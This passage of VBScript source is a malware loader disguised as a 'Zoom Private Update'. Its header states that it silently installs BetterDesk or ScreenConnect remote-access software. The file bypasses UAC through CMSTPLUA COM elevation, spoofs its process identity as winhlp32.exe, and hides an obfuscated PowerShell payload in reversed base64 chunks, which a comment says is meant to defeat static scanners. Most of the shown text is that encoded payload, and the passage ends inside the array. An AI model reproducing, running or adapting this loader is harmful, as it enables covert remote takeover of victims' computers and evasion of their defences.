' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "PNXMKRnQTRVZshGR0YXYutCdrRzc5Mmc4RlengyZulmc0NFN", _
    "1dlYBNWQBRFaWNlSBJEWsBFez5WVXJ3KkRkUrJGcWxWNGhHU", _
    "mtmTTJkVn9SYVpWYRR1QpFVeQRmNGdzYLdjbVFUWEhVOltSe", _
    "LZzYil3Kpp2KVJjVT5kV0YTTld2RUNXaIJDRqRlZltmUWxma", _
    "LNzUwZTdJpGZndWanpkawZ1Uw0kUvZHb6B3b1V2Q6l0N2IXe", _
    "hdjeZJ2dslXS0w2RKlTcXRTUCBlcZJUW1ImaXBXcDJ2aJpma", _
    "5IEWM1WY5QTRwQkaUZmZu1mRTRDW500aqdzSvZTTzIXOvpEN", _
    "Vh3Knd1UTtUTa9UeCJEaIVkZrgTO6pWRmV1cL5GSm52NYlGT", _
    "CNFbolkYrMjUNVlZIdDVm90MPdzYJtWcBFzcSdFSCd1REtiS", _
    "MVEOTtSdkBHM2ljS04UQvV2KEBzLLFEZt10N6p1KChHUlVHN", _
    "sFle2ZmVlF1ZClGbPJESJRlT2pnTvQGW2Q3dBRlewc2cINjW", _
    "xh0QllkYro0L2VnSyQFOQV3MDpEdwcEM5dFMyFHWzkjZjlDV", _
    "nRTcJlXQmpXVnxke0gkcsBzNzM2MIZ3YqtyVEFXUp1UbXZEU", _
    "aZmbhdzZUZnW3lzMr8kN4gzMydmR2lDdyZHVQN3RxE0Qth1M", _
    "xQmd2QFUIN2K4hlMmZHZNRDdENTOxkzY3h3Myo1MINmb5Y3d", _
    "EhTbpl2SOZzRCxUcRlFWsNTWj90U4hUZxcXYUpGT0QDRrUzT", _
    "R1kbxMGWzlDTYNGOkJjTwMDbRlXZx8SOWl1UVd0V1JDVolGR", _
    "GVldzATNMRlNxRjT4pEcFN0ark1RrNkZRtUNmN2YtlEbQ1EO", _
    "3sWO2dzKxMTb3EnNxYmbIZGV5cDVUdjZvYVdydFWv4kQrkzL", _
    "LdFWYFEbLRUSNNXTnplUmhHO0kFRTtWMWJFaM5UdS9SZQRUZ", _
    "odna5o0YkJFNk5UTSlGd3JVM5sGZEhzKnpVca92ajVDVQFWM", _
    "NFleUxGVEFHemF0NGJTawNEUJlTd4h1MnRGcFZWUHtCbwc1b", _
    "CBzS1QTeYtSRhJ0KTRXQjpWRrQnWrJGcD1kMZtGVE9EZYtWZ", _
    "5sUQi9GaCplVEFDSo5mZXVXSKZDVJ9SN3UEdihTbWFUcapnc", _
    "oFFbOZDVBB3UGlWbr4WRlFzZuBFTrkVUuN0L1QEUwgjU54kW", _
    "SNzUBh2NS9yYGdjU4VkSqtmZN5UbIxmdrkDOWFlRQhFcZRGZ", _
    "Jp3UM1mVVdle3QFeKJkUYJUVsVXW2k0LVhnbBRlcWBFTEBVN", _
    "MNFWCZ3arJFNQp2MZlGMUJ2U2QjcOdmT61UarVURQpHVkFkR", _
    "SV2SVd1bRlHM1gnd2kHT1lTUuV2bEZEdxB1KyUWTWN1cIlHb", _
    "PBje1V2LVNWMqZTNulGSqdjemdVeWhDe2RVT6lzc0o2UlR0T", _
    "NhUNxBXaG1UY2MGc3EzZvZnb5FGMtNzcyd2ViVVbQdjUnJUb", _
    "Lh1KzIHZHVjRvRTQ3kHbNlmTqVUOvFTU1FWavs2T4Q0V3tCW", _
    "i9CRPhzTxhza5YnNxkzZEVndC9EOSJjR3YEc1FlZOFFaMREM", _
    "vhUN3kXQ4pkQR5UclNjM5Mkcz4kYltyMDJzN3BnZ2djZ3hXc", _
    "HlHcuBnZqpUUmFmUnd0cvcHNkhGci9ka4UEevVjYTFUcBtmV", _
    "VJjcvZVNPVWZtJGOSBXZsFmV2JkcykkN0gHc50UZyBFVkV1K", _
    "nN0UxU2Qx0GZ3tkVZh0a5YkZCpmYjdGZNFTOldVb3EWWtdjN", _
    "3k3VwMjV1oUatVzTz42QhNnNGZVRYJESWp0KJRVVVxWQPdVR", _
    "mRUVp9UbGZEMvEFV1I2KoZncURlNPhEWwNzR2hEN3QkV6FFN", _
    "iRVWMZUYxhWSStmMOdHRrM0QPZlYzkEaIFWclV1TxgGaiFjN", _
    "IRFTHd1TaNjerMUUDJneJFmbDZVQSN1NqVWasllZHdzSN1GV", _
    "DZ2dvZDNvMEcrk0LrokV4llQDt0KJpUURJmc5EmMxw2SrMGR", _
    "SVTUlNnMQdVOopFWltUZaBlR2IXNT1UQ3RkUPFFOzdWQKFzU", _
    "5gWMsVHNsJ0ZWlGU4MjV2U1ZnhncZBVMj9iew1USw0kUYNnN", _
    "lxmTUdWZrYVcvIFUrMEcaNWblpmY6VlYaF2ctZ2dpNXUGdzV", _
    "VFTaTlGO6JDSDV1brgWSvF2LIlzbyIEOxkUVJRlROhWS1dET", _
    "ItmVndkUHBXZptiS0JFcVRWT0o0K6VTal5EUH50c2VERj10T", _
    "k5mdr9CTWFlR5MESFplaHFzUjpHRzJEWLdzT5QmVFNmQ41EM", _
    "4hHMvtWYF9GUhNVOn9ie5hVN2Mzb28WVzdGZ0oXWFR2Y1pmW", _
    "plmaHNlN3JTY0syLyFke0Zkc1FWSaRDRshTSrgDcJZ1T5EVU", _
    "EhENuFjQOV2drUDZzIjNm9WV3xEexwmNzBFVFlXNQRDalVGe", _
    "2I3Z5U0bERHaYh3VXNma0UlVqVEcUREaCp3YuF1YlRTWFd2Z", _
    "O50Li9kYLd0VzMkTwU3ZWN1VJpGOsFlNvVUevhlMp9GSW90Z", _
    "xcDS5QXUFFTOqFFMXJkQTl1U1VER4oWNxNWZT1kbWNmVNhmb", _
    "J90U4V0YXVVRYtWNjhmYqtCVOtCOxJVcxMkNlJ3MwJGOa9GN", _
    "D50L2cmbkNHT1RTOuZGeKZFUQFFaxQESulUdhFTTxkTSO1EV", _
    "2QWTxV1bl90b3IVNyk2QXVFeJt0TmVTOJd2UkJ2bxNmNnh0N", _
    "CN0a5I3R4h2VTNFUVBzTp90KFF1KhJFV4JnS4lGOoJkQEp0L", _
    "UFTToFmc59CUrhkUxJHZ4FkawYVamB1UTRFWEx2UMNndCB1T", _
    "rdkeXZFaUdmW1Ykb6xmbZpncYFzR6R0TN9kR5wUU4YjQRlXN", _
    "2o0UHpWTEVVe5MDd4kVM4oVbGpXNPZkVPp3U0oUbaxEbuRWN", _
    "oR0KDlnStREVnJnQ6p1L41EVHlTVGV3UwNlcBR3cohGOuZHS", _
    "yQEOJREb6NlQyIGRFp1MidjeDBTTsR2LGdWSW9mW4QjSvdza", _
    "TFXY3RGTyNVeltSQIhEMNdnTkN3VvlUR3l2brZTbCNTezBVb", _
    "6R0N5c0ZShnSCRlRwtkVlhWU2MlMGdjU0EDMOhzcFB3LHRVQ", _
    "MlUS4okVqJ0SxZTRnlkN0pnMVJzNrBnUzQkNz9ES2VnVrRHS", _
    "4YFcSVDRJd3cXtkR4c2T6NWbQ5merw2cWFTRtpVVQlnRQt0T", _
    "Cx2Zqh2cnp0U3MlaHVGbBRnYsxUZM9mW1llQ0YTST9keUFWM", _
    "xF3KaVURZVEe5o2axQzaldVaJpHM0omN3Q2aPFTW2UTWnNkZ", _
    "JtWMVt0R3R1YRRHZtZmazNWMxhlYalkdw8ycQVXejx0QRJ0N", _
    "sFETyEXTHdXYlxmejFVW1ZmQ4gUS252L0ZTaXdjeh50VrxWb", _
    "sJEcrEXWtBHd2cUWGtWcjl2a440bORmZV92cCFWdrZ1LYNFM", _
    "ZtEWx1UQGp2S1g1RWJVcvhldUNjVrIjS2g3U5RHWy82NUBVe", _
    "ChGSHJkVUlUOhJ2NJ9iNxRFamhTWrRHdO9CZl9GdQlWMFRza", _
    "LB1LlZTb1IWVzJTb09SZih0bjdkQOVFcwJkdkhEOL9mQ6p1b", _
    "iB3RGZ2QFNURxdFSzk0N5skVnZGWwFHWih1VzlUNlh3aJxmT", _
    "38GTvJzVMFUTRNnVZZzK4NzcUpmRx1mdzgDUah3bP12ciRma", _
    "5kFSFljWjRGaJVTTt1WbSFXR2hmSyljQxZFbtZWUrxUe1ZVe", _
    "Xh1V0pWM0Yzbs9CMLx0KZpGUTllaMJnSJFzb4ZUcxpndpZDR", _
    "YZWahdzZKZmQZB1MR9SQKZzYJpEMGFGaZ9ETuFzT5gjajdjc", _
    "15WZ2B3Ki52YntyTkBFRvR1dFFkQwgTULFDWjR2c5wUYqxWU", _
    "llmMsZER59yZOV2am9CZ3o1V3EGZmFnZuJHcrQkNv4WNttCd", _
    "Z1GTKVDUtdkajZXcGZDcCFlVYJkULZ0R0tUU2VzViZDR1ZUV", _
    "aNzLmVTdP9Ca280NJVFUhdzQvhmN3tWRwkXVHlETyRjbIhjV", _
    "HFGbZV3K5V0KPZmQnZmRaJ2c6pVZshmZjFDaPZDZuZHS0V2N", _
    "udXYFtWbuVWRwdlV2RESx5GNhFHcKhjQ2cGSHR2UvclYhh0Y", _
    "CRGSqZkVvRHT6hkQXFjVyJXep5Wa2F1QpZ0Ta52U5lGZoJWc", _
    "rUUa112QhlkYuhVUiRXYhdmZE1Wbh9Ed2skSwM0ShJXUxh0d", _
    "RlzdwAjeO5WZ1EzRvgTOmN3a290Thx0SXNkMCFVT0tiMIp0d", _
    "MNjb69Ebst2RZJVUERDSnJGODd0KjRzdVFkNGhlaxRVR1Njb", _
    "BdXVS10Z5M1NWlnThtEe5EWdrZlbVlUZHZkMRBTQwJ0KuNEO", _
    "hx0UaFnVzhXaNJjWzQURJREdDdUcihzawkFMyMkRYpmYvFlc", _
    "kdTeDVldY9WUmJ1aH92SCJFVONlS4RnSMFEUxMje0wmSrklW", _
    "rdlY1kDbhdXcGNFeRpGMGdURwQWbyZVbsV2Zrc3brdWdklzZ", _
    "nRVNltma5kWTahWWZlnWqhlYYVDaJdXQyMUZ440VIFUZ1M1L", _
    "z8WcmZFMrFGdjxkVB5EUoN0YFRWZtFWQE92dSlkTmtkZWdUb", _
    "FdHaPN2QB5kWsFHOrNTZwl0Rvljc0UHSZVUbOJletdmbI12M", _
    "yEUcjNXYzMDOq5URNV1NNRWV6hnRxhHMxkUTEpGUNtWVp1mS", _
    "vtyYwcHc0tkcwAXTqh3KNZEevdzMJdjdChTO1RTNrQFdLFme", _
    "sR3KxZTbSZERGFDRQp2V6d0V3AVcah2Lk9WcyxEVGJUdih0b", _
    "1ZHUhB3SBd2YihETRpXWGJ0YXNnYFlnTSRXQIRFN49yaYlVY", _
    "ilHWYNVd6ZHarE2M3tSWRR0QuFXaOV1cWVUVSVzLQBjNQNEZ", _
    "mdDRtRzc6t0VrZ1RNJWU3ZWUQZWRZJ2aZZmbhxkYhhFa6dXO", _
    "O10ciJ0QGpGRadHOrMzKl9CdmJWdHBldr9EUhdESvNmcpRUQ", _
    "zUzc010KqRjM0BnSStUbwAFTaVEb2MGavIlZvMFTxpVV5J0Z", _
    "GhXb0smMxklRHRFT4EkMzYXejV3VSZnWvMWQ6JFNHhEa6ZDa", _
    "SNFTxYHeSNXeLpEMHJTW4UnVhlWYoNWR390QK5EVupEda1Ee", _
    "pRTetFnSoZlVrAncyclS5cXe5NmTqNXRUFGNZ5EOJBnQw1UM", _
    "pVmb1ZneklmMkh1b1VGR5JHRBJXVsF1ZuJmRExmVydUNyFDc", _
    "YV0SJ1EVwtUe5kTOhl2ZC9yRvd3S2V0aRZXM1UXdipUZKdzY", _
    "EhWRlZ1Usd2QCtyZwVXNN5WOzdFZjp3S0dTY1Z0cVJEcI9ST", _
    "upmW19SbvQVWXp3N4IkTzxWVth2R0MHaZBTaN1mSzplchJXc", _
    "OZWVzxkQuZlVBJWW1UzZ0gUahFHTaJWN1tCWyNzLGJWNnpGR", _
    "DZzNZ5GUxZ3bjpVSDpWZ040cYFVZHRnc2RGOYNVStZDZzUmU", _
    "tVkZLZ1drBXWkxkaiBHMsNleTxWbJFXU2o3Yzd0UKRnVUlmd", _
    "hFTeWp0Y3RFejtSdHhGc0RkRzlXRnNTbplGM4pWbx1WRth1c", _
    "Ip0YjFXZUJUaxp2N2Z1cQBlTGF1b3YWRDpUYrRFOGR3TLN0a", _
    "apWMjx2bDN0bjBHSxMXWoJjV090QrFUNzRUMGZFUhxUV4IkT", _
    "ttGeT9WVhZ1MjdXR5VzLFZjMS92R5VkZulFRk9mQXhXRsxUM", _
    "MF0dzR1KLVmbTRGWp10RNdTMpJzMT1WWShzZ1U1bIFkaQV1b", _
    "ZRHUyM3LYdnW5ZXVS9kez1EOshTVtVHWKh2K1dWc1FmayFWY", _
    "5wUOD10TQp2aiFWZtpkU4g2UXxWQwRVTBJEWulTOFN3Q21Ec", _
    "n9yTKpkbQpnTp5UZrYjVutUZkh1cHtyKolnNzJUQElXbDd1Q", _
    "0Mlc58EcOhUQSNXY0hVeOZTUwolWwVFOKVTMoxURWRGcjl0N", _
    "wFHZ2QjdndXcTtkbaJVMxRnSlx2SnFEcKd3S0wUTxcTSRFEc", _
    "3ZmTYlWe4J0bi9mTCRXQs9yblVXT2cGaONDVVFkRONFWOJHR", _
    "vk0N5hTSDNGdX9UczFUQMZWZwo0aSRkaWpkWxkGRHNnNMhna", _
    "XhFeM5EZwJGaap0SMpFMFNFMNVWcThmaENlUVlUN4NldBpWb", _
    "klmboFDOzVTWIl3ZjpVSztyLaNVNw0GMwpWTZFGT0EXM6BnS", _
    "ExmWLdXWCJmZCdWZyUXVuZ3avM2U5k3ZQpWWwhmc4MGNtpXW", _
    "xBTS1tiY3IHSWJzUhdFRkdEMyYTSTVlM0tGO5oWTwYkaap3c", _
    "0BnMw9SMaBVT3xGeWZVUhVXQpJkMCR2TQNlcuBHOycVNVh1d", _
    "vR0TBp0brIDNspkd3YXWEl0bUN3Q2IXTGpVOD1mamdWY3glc", _
    "Ft2YCFHMyIWdhxmWZFVbXNUQHRmYVF1brUkUDdlNlVmamFXV", _
    "xEnUvEHRQRjShlma2wme4ZGUxYWa2pnQUdnS0RFWKBzQTJHS", _
    "1dUMwQDW5o1TxZlT19yTahVUxIWOMVHMQN1M5cjZvV0az8Wb", _
    "0NFORFzNENHaW10dhdDM1MHUhVVQ1pUay0EZZVkQkZVQHpkN", _
    "kVGMTNkTS1EZFZjSTd3a0c3dq12bvhzUpVDOFdmYJlHRzNUa", _
    "ZFkV4EUUXl3RV5mRaNVb3M1QBx0RI9mWStmY2YXdIJDTzpVV", _
    "FZXWJJFRMhVQ4AHRVhWN2MkYlBzNyg3a1FVN5wGOPdFdJZ3Q", _
    "PNjUBRFZ6BlZEJVa0gmYwBjVTlERwkjZUZFMu9ycJZlY1UTY", _
    "VFUWB5mcPRHeLJVUxklNwAnNZNTcBlXaJR1dvNTYWRUaBN0N", _
    "nhkaqdkT0VGSGFXMoRVc1NWT3JVeWJWYKxEOOJ0QPF0ST9mR", _
    "QRzZhtiMPNjUqZXSP9yc4k2cywEarV1U1M3SJhFb4YmN1wmN", _
    "jBlWudzMrlzM2U2Mv8kM5YEM3hEOJFDZ2UmYm9iR1J3NVlDW", _
    "LZkTaNlQXh3Nt9GRDV3U2EzcspFbhh3YyJnSRFjUvRUb2Jjc", _
    "zUGRPh2SyIUWBhUc18yKFNWM1VnN5xEUyEFWZVVULVGMyI1a", _
    "lZTZyUjWuV3NyBFMwdUU2JFUzwmZk52NyFTa11GaphWd1gmb", _
    "HFkTrJVOqlWQSJ0cGtWSEZkcEhnNY1EakVTa3dEOppXZ2Yjb", _
    "SxWbDlVehlHMLtUUlNVONx0Y4gDdqJTSnVDawRXbxhkQptme", _
    "S1ESnBVS3c2M2EWSO5WS1YjT3AlY0o1SDllM5BHOyYUaiN1Y", _
    "splbzgDZwkUTml2Vwt2LjlmawIjYHVFZoljWHhVdDhHcLlzQ", _
    "xMXTndWbCVFS4Y1Szh3UphjNRpGcyhDMx12TBF0Q3lXdqN3d", _
    "RBTWOdHTqJWaidXasF0KvlDNq5WZIlHTCFGRn52VohVaOd3Y", _
    "4BVSmhTONlWd6JnQ4k1ZXZzaMZXSvQ1YKZzbh90SvQHRJBTR", _
    "n5WMllGOHR0clhEbpd2Ztl1auBlM15kMMlVcmpXVQ1mYRNWV", _
    "WRWVHBDOh1mMnZUb4Z0VpZmM5Q3LVJ3V2gkTQpnUZFncqVWb", _
    "0hDTtRzaYZlWrEFWHBTYOZTavZTTxt0V2hncyxkWwlEavklM", _
    "2UkYLZXWRRXR0R1QjB3T6RzKrc3YDNXS4ITMxQVZ1RlSSZzc", _
    "SZmT3ZESFZlWSB1SltCNwBVYFVGaiBFcz9EO2MUZ0xkbOl1N", _
    "OdGboplNBxEWRR0arA1UHpkRNxGOqhncyUVMyQDNqJzSNJzc", _
    "2kkdmlXMzU2QrJVRHNVbld0UsVUVqRWYqdmemdnb5kFMyMEM", _
    "ZxmYrU2bKJjexgTMWRWYPN2SsNlWzkmcZhDdBtSMrRlV4Z3Q", _
    "oJ1bLRlZzIWO04GU1EWUyIkUWVDV3VWQ6t0Vsx2Q51WNTBDd", _
    "3YDMIl1KJRFWUlEOERXRZ90YS9mTKJzMNpWYlZFSLdlZ2gjd", _
    "TJTS6pFVpp3TVJUejF3NOplbC9GR002VnpFR5gEbtFzT0xEa", _
    "txEeS9iVwtSTWZTRapkZLNzNCd3ZalmeldEe3FjR4ZHZr0We", _
    "UBFSNljY0JmYIRla4wkR4JleNdTVr92R3lTVKJTOIRna2VHO", _
    "zFVQxZ2R6tGb40WOvE2LuBFaRJDR1gkU6N3ZYdFcmF1M6pne", _
    "lN2ZLRGN1NXRzx0cKFGbU92QChGe45WRkZGduxGSXVnalNVe", _
    "3lUe55GewkkVygHUQB1LpBXRPlnc5l3KY9Gb69idyU0KY9kV", _
    "0o0ZOdnZv8yaWtiW6R3T0h0Y2FDNi9UOxMjZ3oldxQGSpRTe", _
    "KtyZPNzMElTVtdlMzJneBNndWFzUGV3cvpUOkN0N2dTUzgnR", _
    "Y9mdXZHUlFTUSZ3ZytyMT9CehFTeL5mcVhEdZVUOPFTUxhHU", _
    "vomYxV1bnRWQmFFVC5kMlFUOvdzTGJHdrklRvVzNzEjNWpVO", _
    "vljMwAjQFN1QI52cnh2br5WSkhUVzx2SkJnY4U1cLRjTxlmb", _
    "FV0cC12KkNGMFh0aB5mRWJ1V09kWpdlcPtkUU5kMqNmMwU0V", _
    "DlnSx5kQvVnVDtWQMtkULtUeMZEdxMHbTBDTxhVQ2Qzbwx0N", _
    "39mbHNVSaB1SJJjbmdUY5U1cNpHSEZlbjFVZolTMyk3T5M2V", _
    "mZWM2hnValjcnplR3hDey5mVrI1NC12SUVmWxoGd1d0KGF2M", _
    "V9WbstyKJBzM1dkbqJjYWJ3KvZjYsFHeJh0c2Z2MiljWY5Wc", _
    "ONzQxgFcnB3c6hGdadGU2V1Y1FzNjBjQwJTW3tSWHdmVRNjd", _
    "PZDWjhjellzKSZXVvtSNvR2KGNDd0Aje2Rzb1ZHRBRnSSp3Z", _
    "ZxmbstkUElHe3lmTr9ke4s0d1REeWN1djJEc2g1VmpnU3UEZ", _
    "UNXaUx2Y0FDbGhVSptWeKZWVTtGb5R1YsZmaYdGWaxWQzZDe", _
    "qtENTl3Nro0V5Fnekt2SqRHWwIERalGOMhGU5h2YWN1N1sGd", _
    "XlkV1UHSXVGUPxWNRJVeu12YzwkUzs2Z0kWa1hjM3dnetN0K", _
    "tpUULNVdzJ3ciVlUyhDMkpkTrRDdkZVRQd1TxQVSJVXYNR1S", _
    "ro3NZpEUEd0Q2NWUjN3Y1NWV3pGSNljTUR2YMdFbzdHRIRzb", _
    "oVES0dmVMxmTql1VEBHU4Y2SIpFMwl2c2kXZTF1ZEBFO3kzY", _
    "kJEMytkSmZ1QUNkW2EnU50GMLhHOVN2TwNzKUF0RQRjM0oEN", _
    "MNEeZF1ZER3RlN1VVxUYXZ1Kh9WWEVXbpdmY2kkQHl0L1hGM", _
    "LdHMrMnZmJEeLVENRNFRol3bvgnSDhzchZEaCJFNJRUTrc1d", _
    "hV2QLN1UwVGV4dlc4kFN5hkQ0ljTxIXS5lmNENlYrhVVTVEU", _
    "VBjSwYUcqp0U2lkQWhHRIh0ZvM3ZDFFOJRzbvMGSzdnSzQzS", _
    "DVndoFjSzZETkhkcidXSGBTOhRzdnV2N50UWENjarAXayEGW", _
    "LJVRDF2aJdnWB1mT1FnW1RTZRJkcoVUazdzcihEZGdFU2Rmc", _
    "wUkYyN2UxRkNDFkclNXU30mN5MnM1cVe0BXc6llNs52L6dFa", _
    "zEHU4M1RFlDSzcHWCp2ZqlkaDNmWoZmd5RUOpdTblhEchxEe", _
    "o9Udo1kVkxUSIx0K2wGar4UMPtGdjVzLENnYn5EcvtSVxhTN", _
    "mJTMYZWMlVzV25kYjV3TvgTdPZES6dmdwF3LUxWU5gXQxVHc", _
    "wEXdzVTOiJWapdHO3l3Q6hHd0FjNXVmR5JjdUt0aH1kT5UUV", _
    "pxWdYh1c3tUTDN1YClVRUljVoNzZxRWbp1WNC5UTQJkTFJHe", _
    "lRWc6pmYDZVSFNlUnp2RFhkSxJzSGRlWpRVawkXRtZUM1Qmd", _
    "IRHR4ZERBlmcQ9UYHhHSOdXNYZDNVF1TOB1QlRHWoVzYrFGc", _
    "QFlQ282LsVXMDVFaEJDcxkmathzRS5keCNFNyRkWtdnQaVWR", _
    "4EkY6l1VlRGOMFFRuhjeoB1dlFnTYJWOihXNrglT2J3Q1kUU", _
    "3MnSHVWYNRHcxZDZkNFMQ10R4gGZWBTdKFVO2VzQJ1UWtF3R", _
    "4g1SKlUbKR0Kwo3Y2sWN3QHNOBnZaJWSKBnNp9WVFVzNx9ia", _
    "rEFZzc1bqRlW352YxAnVRpXawAVQlFnYyx0NE92SlRXOrIXQ", _
    "3IzMk5WYvN0LTNVcodzVRNFbtNVaSJjdsNUb3IjNxN0VPBna", _
    "CJWUuhmZ3cjMPZ0YaR3S5gzVopGcmpHey4EavcWOxNTVFV0K", _
    "yRFWHRTdOhna2xGZOljevlnWyBnWTxUOyEXb2I1UyZFT0UVU", _
    "SRUb3RnR4A1TWNjWzRDZLJUYjBzdWBTOrNWOvYDRmR2TwVjT", _
    "2IGWOZEc0k3av8CaoFXcFRDM5NHc45EZ0l0Y49iMwUHZxVWd", _
    "wpHZY1UU4FTRYVVNzRDdzxUbsRFV1g3VlFnatdnW0dXc0BVb", _
    "OtGdCdWeMtyVOxWV1MHMGlmVBJ0UudWQMRjNTFFZGF3N0w2Y", _
    "0oFWCBXcjRzTW9GbzUXVIFUUFl2cvpndV9yRvUTc0BzY5ZlU", _
    "yEnU0l1aChUQvVVbL1kMXdTWlxGc29UekVUNxRUQD9kZ4NEU", _
    "PR1ZsVVR4dUYil3a0cTS0MjU1JlZHRTVRNWaa9EcURXb6FTb", _
    "6RGb1IDZ4kjY6NWQLtCRVVFR1gUU0x2LIdzU2F2aG90Zv5GZ", _
    "xJlZOpmWoplR5dHOtp1RahETPllWFRmUwg0b0QjeiVHWwolT", _
    "2hTStxkNYBDT5g3cvMmSJJGW6lTQqRmWmVFaElTbwglemFVc", _
    "4NlY4NGOERjVjdGWFZkVyk1SuJzL4UUNmJzdmFjVmR3ctBnT", _
    "L5UdvYERpBjVwJkTxdkQrkWQuFUd2EnVSFUOkZlUK10L4IjQ", _
    "vN3dwo3VjJlSo5GepZzT6NjTpdEW0tUUaxESHxUOFRUb5lzQ", _
    "1tSS51kerF0buxGRyBHNChEbGxENysEa3cjaN9UWL9UY0A3Z", _
    "RlmVyIHR4JmWkVXSy12NLpXVXJUQChEUDZUNUt2LyhmMrVlN", _
    "k5UcBVVbyl0NFxEbqhDOplnTvJVcyMWMQVmeVV2MGp2clNTO", _
    "aNHbvhUN112QG9SVXtEM15GT0EzK6BTVGNWTCFUWBZFe19SY", _
    "nd3Y5AXVy4ENVJmMJZ0bMBjM3VmRyVnWUNzSZp1LzMDMKhVb", _
    "W1UOrF1VrBjYVVUZulWQltGSmVDaKJGR4c1UaxGVv8SM0xUN", _
    "zw0TX9yaxRjW4RUWqplbjxkchRDRlJ1Uw4WYRBlVsd1Lkh2Z", _
    "1hFOr8SO4RkY1tCNYlzK4o2N2dDMUB1L5wkN5cTd4QjQt9ia", _
    "xF1TUtycQJ3b5BTV3I1TGZ2YhxGUpRzYkhVbF9SMINTd3M3N", _
    "0V2KvNTNIdkMpdGbvE0d0dzQrFVYPNVQr4kSapFTiljQxAFc", _
    "xsiR0xmZvYVTMVnRjRzKNZXZwETOW1kcylkezoHM25maWRjZ", _
    "ydGT5w2VwEjRTZFdzgWVXN2NyEEV0UFMIBXRu9kYXlGRjVFd", _
    "2YFcVBHb5lmS5Y1ZrJXVatSV2oHbzVVY20UWWRGT0RmWU1mc", _
    "yRDcwFlTiRkMhJGZhdkVOp1RrU1LKlHeodlbyNmM3VTSUZVd", _
    "Rd2KrYTWld2Zh9WVkFXThNHd2ZjVLBVOvUFUGFFMv8mcyc2K", _
    "1ZlWVljQ4UUe10EZiJFU4cmZadTTXFUOzNWewBTZuZjRZhzT", _
    "LRTSwF1MwcmSuZVOUZTS6FzQQ1GdYxEMUN3KaVkTXVVMlNnc", _
    "INTTLJHTMlGRoNlT3ZmMt9iawETWad0dHRXQJlGdZJkSDtmQ", _
    "6hVVMBTOUZXbKZTQYBjR51UeDdldmZXdxdneIRVZwkVNihWO", _
    "LBDbyIDSGhkWDNnQ2siM5oGa2NUN54UNF1Eesh2RKJjYvElV", _
    "zBTUyl3MrplVsV1KnJUdPBXcZtSW6V3a4ZXVzpGdoV3Y59Ud", _
    "qdVRtxGcJJkd5pFO2o0chtER0EHd0glUxg3d25mNYVVe552Z", _
    "0NGWvR2QUpkdjVzM3pWbhF0K3lVY2FnW6hTUKVGU5syKKJXQ", _
    "HN1d1VmT4RDZqhGc4IHSUJjZBlWd4BzVapnb3IXOZhmQiR2Y", _
    "xMTZJFVVVJTZ6hHa5dFcDVEaldXc5gFS1ckYnF1dhZ3LRJ3Z", _
    "1cVYLVjQYRzKzY2KrwmerhDRupmYFNWbENHU4xUQmt2LjdGb", _
    "0UmSKxWZKNEM0U1VVRGNwoVbtB1NSxWetFlcsllUvQUeL9yd", _
    "3VmTg0DItFWZyR3U6dGJgACIgoQDpcCT48ici1mU0d2V4JnU", _
    "K0QKzVGd5JkenRCLo0WYlJHdTlncv1WZN5yTJBCdjVmai9UL", _
    "vl2czVmcw12bD5yTJBCdjVmai9UL3VmTg0DIwlmenRCIgACI", _
    "yBXbvNkLPl0WgwSbhVmc0NlenRCKtFWZyR3UlRXYsZWZE5ib", _
    "pM3clJHct92YlRkO60VZk9WTu9WazNXZyBXbvNkLu9WazNXZ", _
    "tFWZyR3Uu8USgQ3YlpmYP1ydl5EI9AiclRWYlJHJgACIgoQD", _
    "pgjRUVlO601ZulGZvNmbF5Cd4VGVbBCLwlmenRCKyVGZhVmU", _
    "NkCKk5WRvRFZhVmUuIXZkFWZyRCI9ASZjJXdvNHJgACIgoQD", _
    "z9GczlGRuAXa6dGJgsTKoU2cvB3cpRkLyVGZhVmckACIgAiC", _
    "g0DIwNGJgACIgoQDpgSZz9GczlGRu0WYlJHdTp3ZkAyOpgSZ", _
    "D5iclxWaw12bD5SbvRUZk92Qu0WZ0NXeTBCdjVmai9UL3VmT", _
    "JVGdhJXZuV2RuA3YkACIgAiCNMnclRXZtFmchBlclxWaw12b", _
    "lhXRlRXYyVmbldkLwNGJgACIgoQDlVnc0RCI9ASey9Wbl1kb", _
    "w9kclxWaw12bD5CcjRCIgACIK0QZzxWYmRCI9ASZsJWY0V3Y", _
    "u0WZ0NXeTdCKABCIgAiCNcyKlpXatlGdw92LnASPgMnbvlGd", _
    "yV3YlNlLtVGdzl3UnwyJsxGZuUmcvNkLtVGdzl3UnwyJsxGZ", _
    "GBCfgkyJsxGZuAnchh2UD5Cdm92cvJ3Yp10JscCbsRmL5RXa", _
